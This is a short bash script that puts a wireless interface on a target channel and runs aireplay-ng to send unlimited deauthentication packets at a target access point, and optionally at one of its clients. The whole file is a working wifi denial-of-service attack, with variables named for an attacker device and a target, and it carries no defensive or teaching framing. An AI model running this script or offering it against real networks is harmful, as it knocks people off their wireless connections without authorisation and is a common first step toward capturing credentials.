#!/bin/bash

source ./config.cfg

iwconfig $ATKDEV channel $TARGET_CHANNEL

if [ -z "$TARGET_DEVICE" ]
then
    aireplay-ng -0 0 -a $TARGET_BSSID $ATKDEV --ignore-negative-one
else
    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $ATKDEV --ignore-negative-one
fi

